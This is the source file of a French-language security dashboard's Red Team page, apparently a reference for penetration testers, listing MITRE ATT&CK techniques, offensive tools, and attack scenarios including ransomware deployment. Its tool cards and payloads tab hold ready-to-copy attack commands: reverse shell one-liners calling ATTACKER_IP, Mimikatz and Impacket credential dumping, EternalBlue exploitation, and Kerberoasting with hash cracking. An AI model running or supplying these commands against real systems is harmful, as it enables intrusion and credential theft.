// ============================================================
//  redteam.js — Vue Red Team : TTPs, MITRE ATT&CK, outils
// ============================================================

const MITRE_TACTICS = [
  { id:'TA0001', name:'Reconnaissance',       color:'#ff3366', techs:[
    { id:'T1595', name:'Active Scanning' },{ id:'T1592', name:'Gather Host Info' },
    { id:'T1589', name:'Gather Identity Info' },{ id:'T1590', name:'Gather Network Info' },
    { id:'T1598', name:'Phishing for Info' },
  ]},
  { id:'TA0003', name:'Initial Access',        color:'#ff9500', techs:[
    { id:'T1190', name:'Exploit Public App' },{ id:'T1133', name:'External Remote Svc' },
    { id:'T1566', name:'Phishing' },{ id:'T1195', name:'Supply Chain' },
    { id:'T1078', name:'Valid Accounts' },
  ]},
  { id:'TA0004', name:'Execution',             color:'#ffd700', techs:[
    { id:'T1059', name:'Command & Scripting' },{ id:'T1203', name:'Client Exploit' },
    { id:'T1106', name:'Native API' },{ id:'T1053', name:'Scheduled Task' },
    { id:'T1204', name:'User Execution' },{ id:'T1047', name:'WMI' },
  ]},
  { id:'TA0005', name:'Persistence',           color:'#a3e635', techs:[
    { id:'T1098', name:'Account Manipulation' },{ id:'T1547', name:'Boot AutoStart' },
    { id:'T1505', name:'Server Software' },{ id:'T1176', name:'Browser Extensions' },
  ]},
  { id:'TA0006', name:'Privilege Escalation',  color:'#00e676', techs:[
    { id:'T1548', name:'Abuse Elevation' },{ id:'T1134', name:'Access Token' },
    { id:'T1068', name:'Exploit Priv Esc' },{ id:'T1055', name:'Process Injection' },
  ]},
  { id:'TA0007', name:'Defense Evasion',       color:'#00d4ff', techs:[
    { id:'T1562', name:'Impair Defenses' },{ id:'T1070', name:'Indicator Removal' },
    { id:'T1036', name:'Masquerading' },{ id:'T1027', name:'Obfuscated Files' },
    { id:'T1218', name:'System Binary Proxy' },
  ]},
  { id:'TA0008', name:'Credential Access',     color:'#818cf8', techs:[
    { id:'T1110', name:'Brute Force' },{ id:'T1555', name:'Creds from Stores' },
    { id:'T1187', name:'Forced Auth' },{ id:'T1003', name:'OS Cred Dumping' },
    { id:'T1558', name:'Steal Kerberos Ticket' },
  ]},
  { id:'TA0009', name:'Discovery',             color:'#a855f7', techs:[
    { id:'T1087', name:'Account Discovery' },{ id:'T1083', name:'File & Dir Disc.' },
    { id:'T1046', name:'Network Scan' },{ id:'T1057', name:'Process Discovery' },
    { id:'T1018', name:'Remote System Disc.' },
  ]},
  { id:'TA0010', name:'Lateral Movement',      color:'#f472b6', techs:[
    { id:'T1210', name:'Exploit Remote Svc' },{ id:'T1570', name:'Tool Transfer' },
    { id:'T1021', name:'Remote Services' },{ id:'T1550', name:'Alt Auth Material' },
  ]},
  { id:'TA0011', name:'Collection',            color:'#fb923c', techs:[
    { id:'T1560', name:'Archive Collected' },{ id:'T1115', name:'Clipboard Data' },
    { id:'T1005', name:'Local System Data' },{ id:'T1113', name:'Screen Capture' },
  ]},
  { id:'TA0040', name:'Impact',                color:'#ef4444', techs:[
    { id:'T1486', name:'Data Encrypted' },{ id:'T1485', name:'Data Destruction' },
    { id:'T1490', name:'Inhibit Recovery' },{ id:'T1489', name:'Service Stop' },
  ]},
];

const RED_TOOLS = [
  { name:'Nmap',         cat:'Reconnaissance',      color:'#00d4ff', link:'https://nmap.org',
    desc:'Scanner réseau — découverte hôtes, ports, services, détection OS',
    cmd:'nmap -sV -sC -A -p- 192.168.1.0/24\nnmap --script vuln 192.168.1.100' },
  { name:'Metasploit',   cat:'Exploitation',        color:'#ff3366', link:'https://www.metasploit.com',
    desc:'Framework d\'exploitation modulaire — centaines de modules CVE',
    cmd:'msfconsole\nuse exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 192.168.1.x\nrun' },
  { name:'Burp Suite',   cat:'Web',                 color:'#ff6b1a', link:'https://portswigger.net/burp',
    desc:'Proxy HTTP pour tests d\'applications web (SQLi, XSS, IDOR, SSRF)',
    cmd:'# Proxy: 127.0.0.1:8080\n# Intercept → Repeater → Intruder\n# Scanner actif sur endpoints' },
  { name:'BloodHound',   cat:'Active Directory',    color:'#a855f7', link:'https://github.com/BloodHoundAD/BloodHound',
    desc:'Analyse graphique des chemins d\'attaque Active Directory',
    cmd:'SharpHound.exe -c All\n# Importer JSON dans BloodHound\n# Find Shortest Paths to Domain Admin' },
  { name:'Mimikatz',     cat:'Credential Access',   color:'#ffd700', link:'https://github.com/gentilkiwi/mimikatz',
    desc:'Extraction de credentials Windows (NTLM, Kerberos, WDigest, DPAPI)',
    cmd:'privilege::debug\nsekurlsa::logonpasswords\nlsadump::dcsync /domain:corp.local /user:Administrator' },
  { name:'Responder',    cat:'Credential Access',   color:'#00e676', link:'https://github.com/lgandx/Responder',
    desc:'LLMNR/NBT-NS/mDNS poisoning — vol de hashes NTLMv2 sur le LAN',
    cmd:'sudo python3 Responder.py -I eth0 -wd\n# Cracker le hash:\nhashcat -m 5600 hash.txt rockyou.txt' },
  { name:'Impacket',     cat:'Post-Exploitation',   color:'#00d4ff', link:'https://github.com/fortra/impacket',
    desc:'Suite Python pour protocoles réseau Windows (SMB, RPC, LDAP, Kerberos)',
    cmd:'impacket-psexec domain/user:pass@target\nimpacket-secretsdump domain/admin:pass@dc\nimpacket-getTGT domain/user:pass' },
  { name:'CrackMapExec', cat:'Lateral Movement',    color:'#ff6b1a', link:'https://github.com/byt3bl33d3r/CrackMapExec',
    desc:'Swiss-army knife réseau Windows — SMB, WinRM, LDAP, MSSQL',
    cmd:'cme smb 192.168.1.0/24 -u admin -p password\ncme smb target --shares\ncme smb target --sam' },
  { name:'SQLmap',       cat:'Web',                 color:'#ffc107', link:'https://sqlmap.org',
    desc:'Détection et exploitation automatique des injections SQL',
    cmd:'sqlmap -u "http://target/page.php?id=1" --dbs\nsqlmap -u "http://target/?id=1" -D db -T users --dump' },
  { name:'Nuclei',       cat:'Reconnaissance',      color:'#00e676', link:'https://github.com/projectdiscovery/nuclei',
    desc:'Scanner de vulnérabilités rapide basé sur templates YAML communautaires',
    cmd:'nuclei -u https://target.com -t cves/\nnuclei -l urls.txt -t vulnerabilities/ -severity critical,high' },
  { name:'Cobalt Strike', cat:'C2',                 color:'#ff3366', link:'https://www.cobaltstrike.com',
    desc:'Framework C2 commercial — beacons, post-exploitation, pivoting, Malleable C2',
    cmd:'# Teamserver + listener HTTP/S\n# Beacon stager generation\n# Malleable C2 profile pour OPSEC' },
  { name:'Havoc',        cat:'C2',                  color:'#a855f7', link:'https://github.com/HavocFramework/Havoc',
    desc:'Framework C2 open-source moderne — alternative à Cobalt Strike',
    cmd:'./havoc server --profile profiles/havoc.yaotl\n# Connecter Havoc UI\n# Générer un agent Demon' },
];

const ATTACK_SCENARIOS = [
  { name:'Compromission Active Directory', icon:'🏰', difficulty:'CRITICAL', steps:[
    'Reconnaissance — Nmap, LDAP enum, DNS',
    'Phishing → Beacon initial access',
    'BloodHound — Analyser les chemins AD',
    'Kerberoasting — SPN tickets → crack offline',
    'Lateral movement via PsExec / WMI / WinRM',
    'DCSync → Dump tous les hashes NTLM',
    'Golden Ticket — Persistance indéfinie',
  ]},
  { name:'Web Application Attack Chain', icon:'🕸️', difficulty:'HIGH', steps:[
    'Burp Suite — Mapper endpoints et paramètres',
    'SQL Injection → Dump de base de données',
    'LFI/Path Traversal → Lecture fichiers serveur',
    'Webshell upload via LFI ou file upload',
    'SUID / sudo escalation → root',
    'Pivot vers réseau interne via SSH tunnel',
  ]},
  { name:'Ransomware Deployment', icon:'💀', difficulty:'CRITICAL', steps:[
    'Phishing spear avec macro Office',
    'Meterpreter → Enumération réseau interne',
    'Lateral movement via SMB (EternalBlue / Pass-the-Hash)',
    'Désactivation des backups (VSS delete)',
    'Exfiltration données sensibles (double extortion)',
    'Déploiement ransomware par GPO / PsExec',
    'Ransom note + contact C2',
  ]},
  { name:'Supply Chain Attack', icon:'🔗', difficulty:'CRITICAL', steps:[
    'Identifier les dépendances logicielles de la cible',
    'Compromettre un package NPM / PyPI / NuGet',
    'Injecter un backdoor dans le code source',
    'Attendre les builds automatiques',
    'Exécution sur les machines des développeurs',
    'Mouvement latéral vers les environnements prod',
  ]},
];

export function render(container) {
  container.innerHTML = '';
  container.className = 'content fade-in';

  container.innerHTML = `
    <div class="page-header">
      <div>
        <div class="page-title" style="color:var(--red)">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <path d="m14.5 12.5-8 8a2.119 2.119 0 0 1-3-3l8-8"/>
            <path d="m16 16 6-6"/><path d="m8 8 6-6"/><path d="m9 7 8 8"/><path d="m21 11-8-8"/>
          </svg>
          Red Team
        </div>
        <div class="page-subtitle">Techniques d'attaque · TTPs MITRE ATT&CK · Outils offensifs · Scénarios</div>
      </div>
      <span class="badge badge-critical" style="padding:6px 14px">⚔️ Offensive Security</span>
    </div>

    <!-- Tabs -->
    <div class="tab-nav" style="background:var(--bg-card);border:1px solid var(--border);border-radius:var(--radius-lg) var(--radius-lg) 0 0;padding:0 16px">
      <button class="tab-btn active" data-tab="matrix">MITRE ATT&CK</button>
      <button class="tab-btn" data-tab="tools">Outils</button>
      <button class="tab-btn" data-tab="scenarios">Scénarios</button>
      <button class="tab-btn" data-tab="payloads">Payloads</button>
    </div>

    <div style="background:var(--bg-card);border:1px solid var(--border);border-top:none;border-radius:0 0 var(--radius-lg) var(--radius-lg);overflow-y:auto;max-height:calc(100vh - 225px)">

      <!-- MITRE Matrix -->
      <div class="tab-pane active" id="tab-matrix" style="padding:16px">
        <p style="font-size:12px;color:var(--text-3);margin-bottom:12px">
          Cliquez sur une technique pour ouvrir la page MITRE officielle.
        </p>
        <div class="mitre-matrix">
          ${MITRE_TACTICS.map(tactic => `
            <div class="mitre-tactic">
              <div class="mitre-tactic-header" style="color:${tactic.color};background:${tactic.color}1a">
                ${tactic.name}
              </div>
              ${tactic.techs.map(t => `
                <div class="mitre-tech" data-tech-id="${t.id}" title="${t.id}">
                  <span style="font-size:9px;color:var(--text-3);display:block">${t.id}</span>
                  ${t.name}
                </div>
              `).join('')}
            </div>
          `).join('')}
        </div>
      </div>

      <!-- Tools -->
      <div class="tab-pane" id="tab-tools" style="padding:16px">
        <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(330px,1fr));gap:12px">
          ${RED_TOOLS.map(tool => `
            <div class="card" style="border-left:3px solid ${tool.color};padding:14px">
              <div style="display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:8px">
                <div>
                  <div style="font-size:14px;font-weight:700;color:var(--text-1)">${tool.name}</div>
                  <div style="font-size:10px;color:${tool.color};text-transform:uppercase;letter-spacing:.5px">${tool.cat}</div>
                </div>
                <a href="${tool.link}" target="_blank" class="btn btn-ghost btn-sm" style="font-size:10px;padding:3px 8px;flex-shrink:0">↗</a>
              </div>
              <div style="font-size:12px;color:var(--text-2);margin-bottom:10px">${tool.desc}</div>
              <div class="code-block" style="margin:0">
                <div class="code-header"><span class="code-lang">bash</span><button class="code-copy">Copier</button></div>
                <pre style="max-height:72px;overflow:hidden"><code class="language-bash">${escHtml(tool.cmd)}</code></pre>
              </div>
            </div>
          `).join('')}
        </div>
      </div>

      <!-- Scenarios -->
      <div class="tab-pane" id="tab-scenarios" style="padding:16px">
        <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px">
          ${ATTACK_SCENARIOS.map(sc => `
            <div class="card" style="border-top:2px solid var(--red)">
              <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px">
                <span style="font-size:26px">${sc.icon}</span>
                <div>
                  <div style="font-size:13px;font-weight:700;color:var(--text-1)">${sc.name}</div>
                  <span class="badge badge-${sc.difficulty.toLowerCase()}">${sc.difficulty}</span>
                </div>
              </div>
              <div style="display:flex;flex-direction:column;gap:4px">
                ${sc.steps.map((step, i) => `
                  <div style="display:flex;gap:8px;padding:6px 8px;background:var(--bg-2);border-radius:5px">
                    <span style="font-family:var(--text-mono);font-size:10px;color:var(--red);font-weight:700;flex-shrink:0;width:18px">${i + 1}.</span>
                    <span style="font-size:11px;color:var(--text-2)">${step}</span>
                  </div>
                `).join('')}
              </div>
            </div>
          `).join('')}
        </div>
      </div>

      <!-- Payloads -->
      <div class="tab-pane" id="tab-payloads" style="padding:16px">
        <div style="display:grid;gap:14px">
          ${getPayloads().map(p => `
            <div class="card">
              <div class="card-header">
                <div class="card-title">${p.icon} ${p.name}</div>
                <span class="badge badge-${p.risk.toLowerCase()}">${p.risk}</span>
              </div>
              <p style="font-size:12px;color:var(--text-2);margin-bottom:10px">${p.desc}</p>
              <div class="code-block">
                <div class="code-header"><span class="code-lang">${p.lang}</span><button class="code-copy">Copier</button></div>
                <pre><code class="language-${p.lang}">${escHtml(p.code)}</code></pre>
              </div>
            </div>
          `).join('')}
        </div>
      </div>
    </div>
  `;

  // Tabs
  container.querySelectorAll('.tab-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      container.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
      container.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
      btn.classList.add('active');
      document.getElementById('tab-' + btn.dataset.tab)?.classList.add('active');
    });
  });

  // MITRE click
  container.querySelectorAll('.mitre-tech').forEach(tech => {
    tech.addEventListener('click', () => {
      window.open(`https://attack.mitre.org/techniques/${tech.dataset.techId}/`, '_blank', 'noopener');
    });
  });

  // Highlight + copy
  setTimeout(() => {
    container.querySelectorAll('pre code').forEach(el => { if (window.hljs) window.hljs.highlightElement(el); });
    container.querySelectorAll('.code-copy').forEach(btn => {
      btn.addEventListener('click', () => {
        const code = btn.closest('.code-block')?.querySelector('code')?.textContent || '';
        navigator.clipboard?.writeText(code).then(() => { btn.textContent = '✓'; setTimeout(() => btn.textContent = 'Copier', 1500); });
      });
    });
  }, 50);
}

function getPayloads() {
  return [
    { name:'Reverse Shell One-Liners', icon:'🐚', risk:'CRITICAL', lang:'bash', desc:'Reverse shells multi-plateformes',
      code:`# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python 3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# PowerShell
powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$send=(iex $data 2>&1|Out-String);$stream.Write([text.encoding]::ASCII.GetBytes($send),0,$send.Length)}"

# Listener côté attaquant
nc -lvnp 4444` },
    { name:'Windows Privilege Escalation Checklist', icon:'⬆️', risk:'HIGH', lang:'powershell', desc:'Vecteurs d\'élévation de privilèges Windows',
      code:`# 1. Privilèges actuels
whoami /all

# 2. Services avec unquoted paths
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\"

# 3. AlwaysInstallElevated (RCE en SYSTEM via MSI)
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

# 4. Tâches planifiées vulnérables
schtasks /query /fo LIST /v | findstr /i "task name\\|run as user\\|task to run"

# 5. Credentials en clair
cmdkey /list
Get-ChildItem -Path C:\\Users\\ -Recurse -Include *.xml,*.ini,*.txt -ErrorAction SilentlyContinue |
  Select-String -Pattern "password" | Select-Object Path,LineNumber,Line

# 6. WinPEAS (automatisé)
.\\winPEASx64.exe quiet` },
    { name:'Kerberoasting — AD Attack', icon:'🎟️', risk:'HIGH', lang:'powershell', desc:'Extraction et crack de tickets Kerberos de comptes de service',
      code:`# 1. Lister les comptes avec SPN
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName |
  Select SamAccountName, ServicePrincipalName

# 2. Demander les TGS (Rubeus)
.\\Rubeus.exe kerberoast /outfile:hashes.txt /rc4opsec

# 3. Impacket (depuis Kali)
impacket-GetUserSPNs domain.local/user:pass -dc-ip DC_IP -request -outputfile hashes.txt

# 4. Crack avec Hashcat (mode 13100 = Kerberos TGS-REP RC4)
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule

# 5. Si succès → DCSync
impacket-secretsdump domain.local/svc_cracked:Password1@DC_IP` },
  ];
}

function escHtml(str) {
  return (str || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}
